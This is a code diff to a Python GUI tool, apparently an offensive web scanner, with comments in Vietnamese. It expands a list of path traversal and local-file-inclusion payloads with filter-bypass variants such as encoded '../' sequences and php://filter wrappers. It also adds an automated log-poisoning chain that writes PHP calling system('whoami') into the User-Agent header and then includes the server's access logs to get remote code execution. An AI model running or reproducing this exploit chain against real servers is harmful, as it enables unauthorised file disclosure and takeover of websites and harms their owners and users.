@@ -14,17 +14,31 @@ class LFIThread(QThread):
         self.targets = list_urls
         self.is_running = True
         
-        #path treversal payloads
+        # Thêm Header giả lập trình duyệt thật để vượt qua các bộ lọc User-Agent cơ bản
+        self.headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36'}
+        
+        # Path traversal payloads
         self.payloads_file = [
+            # 1. Payload chuẩn & Payload ma thuật test tay thành công trên Burp Suite
             "../../../../etc/passwd",
-            "../../../../windows/win.ini",
+            ".../../../../etc/passwd",  # <--- Payload bypass 3 dấu chấm
+            
+            # 2. Payload Đột biến sâu (Mutation / Bypass Filter)
+            "../../../../../../../../etc/passwd",
+            "../../../../../../../../windows/win.ini",
+            "..././..././..././..././etc/passwd",      
+            "....//....//....//....//etc/passwd",      
+            "..%2f..%2f..%2f..%2fetc/passwd",          
+            "..%252f..%252f..%252f..%252fetc/passwd",  
+            
+            # 3. Payload đọc mã nguồn (LFD / LFI)
             "/etc/passwd",
-            "./index.php", 
             "index.php",
+            "./index.php",
             "php://filter/convert.base64-encode/resource=index.php"
         ]
         
-        #duong dan file log
+        # Đường dẫn file log để tấn công RCE
         self.log_paths = [
             "/var/log/apache2/access.log",
             "/var/log/nginx/access.log",
@@ -32,12 +46,15 @@ class LFIThread(QThread):
             "../../../../var/log/apache2/access.log"
         ]
         
-        # singatures 
+        # Signatures (Đã lọc sạch các tag nhiễu như <html>, PNG)
         self.signatures = [
-            b"root:x:0:0", b"[extensions]", b"[fonts]", b"<?php", b"<html>", b"JFIF", b"PNG"
+            b"root:x:0:0",        # Đặc trưng của /etc/passwd trên Linux
+            b"[extensions]",      # Đặc trưng của win.ini trên Windows
+            b"[fonts]",           # Đặc trưng của win.ini trên Windows
+            b"<?php",             # Đặc trưng mã nguồn PHP
         ]
 
-        # doan ma php de check RCE
+        # Đoạn mã PHP để đầu độc Log (Log Poisoning)
         self.rce_code = "<?php HACKED!! echo 'da RCE thanh cong'; system('whoami'); ?>"
 
     def run(self):
@@ -49,12 +66,12 @@ class LFIThread(QThread):
             parsed = urlparse(url)
             base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
             params = parse_qs(parsed.query)
-            print(params) 
+            
             if not params: continue
 
             found_lfi_param = None 
 
-            #tan cong path traversal 
+            # Tấn công path traversal 
             for param_name in params:
                 for payload in self.payloads_file:
                     if not self.is_running: break
@@ -68,60 +85,74 @@ class LFIThread(QThread):
                     attack_url = f"{base_url}?{'&'.join(new_query_parts)}"
                     
                     try:
-                        res = requests.get(attack_url, timeout=5)
+                        # Gửi Request kèm Header và Tăng Timeout lên 10s
+                        res = requests.get(attack_url, headers=self.headers, timeout=10)
                         content = res.content
 
-                        preview = content[:50].replace(b'\n', b' ').decode('utf-8', errors='ignore')
-                        self.log_process.emit(f"Check Path Treversal: ...{attack_url[-40:]} | Len: {len(content)}")
+                        self.log_process.emit(f"Check Path Traversal: ...{attack_url[-40:]} | Len: {len(content)}")
 
                         is_vuln = False
                         
+                        # Ép toàn bộ content trả về thành chữ thường (Bypass chữ hoa <?PHP)
+                        content_lower = content.lower()
+                        
                         # Check Signature
                         for sig in self.signatures:
-                            if sig in content:
+                            if sig.lower() in content_lower:
                                 is_vuln = True
                                 break
                         
-                        # Check Base64
+                        # Check Base64 (Nếu bị ép mã hóa qua Wrapper)
                         if not is_vuln:
                             try:
                                 possible_b64s = re.findall(b'[a-zA-Z0-9+/=]{20,}', content)
                                 for b64_str in possible_b64s:
                                     decoded = base64.b64decode(b64_str)
-                                    if b"<?php" in decoded or b"root:" in decoded:
+                                    decoded_lower = decoded.lower()
+                                    if b"<?php" in decoded_lower or b"root:" in decoded_lower:
                                         is_vuln = True
                                         break
                             except: pass
 
                         if is_vuln:
-                            if "../" in payload or payload.startswith("/") or payload.startswith("..\\"):
+                            payload_lower = payload.lower()
+                            
+                            # Phân loại Lỗi: Bao quát tất cả các payload đột biến
+                            if ("../" in payload_lower or 
+                                ".../" in payload_lower or 
+                                "..../" in payload_lower or 
+                                "%2f" in payload_lower or
+                                "etc/passwd" in payload_lower or 
+                                "win.ini" in payload_lower or
+                                payload.startswith("/") or
+                                payload.startswith("..\\")):
                                 vuln_type = "CÓ LỖI (PATH TRAVERSAL)"
                             else:
                                 vuln_type = "CÓ LỖI (LOCAL FILE DISCLOSURE)"
 
-                            # Phát tín hiệu lên GUI với loại lỗi đã phân loại
+                            # Phát tín hiệu lên GUI
                             self.ket_qua_scan.emit(url, payload, vuln_type)
                             self.log_process.emit(f"<b style='color:orange'>[+] Đọc được file: {payload} - Phân loại: {vuln_type}</b>")
                             
                             found_lfi_param = param_name
-                            break 
+                            #break 
                             
                     except Exception: pass
                 
                 if found_lfi_param: break 
 
-           #kiem tra RCE neu co LFI
+            # Kiểm tra RCE nếu có LFI
             if found_lfi_param:
                 self.log_process.emit(f"<b style='color:red'>☠️ PHÁT HIỆN LỖI! ĐANG THỬ RCE...</b>")
                 
-                # log poisoning
+                # Bắt đầu kỹ thuật Log Poisoning
                 self.log_process.emit(">> Thử Log Poisoning...")
                 try:
-                    # Bơm thuốc
-                    headers = {'User-Agent': self.rce_code}
-                    requests.get(url, headers=headers, timeout=5)
+                    # Bơm thuốc: Đưa mã độc PHP vào User-Agent để Server ghi vào Access Log
+                    headers_poison = {'User-Agent': self.rce_code}
+                    requests.get(url, headers=headers_poison, timeout=5)
                     
-                    # Kích nổ
+                    # Kích nổ: Dùng lỗ hổng LFI để include ngược lại file Access Log
                     for log_path in self.log_paths:
                         new_query_parts = []
                         for k, v in params.items():
@@ -130,7 +161,8 @@ class LFIThread(QThread):
                                 for val in v: new_query_parts.append(f"{k}={val}")
                         exploit_url = f"{base_url}?{'&'.join(new_query_parts)}"
                         
-                        res = requests.get(exploit_url, timeout=5)
+                        # Truy cập URL kích nổ (nhớ kèm header chuẩn để không sinh thêm log rác)
+                        res = requests.get(exploit_url, headers=self.headers, timeout=10)
                         if b"HACKED" in res.content:
                             self.ket_qua_scan.emit(url, "Log Poisoning", "RCE THÀNH CÔNG")
                             self.log_process.emit(f"<h2 style='color:red; background:yellow'>💥 RCE VIA LOG POISONING!</h2>")
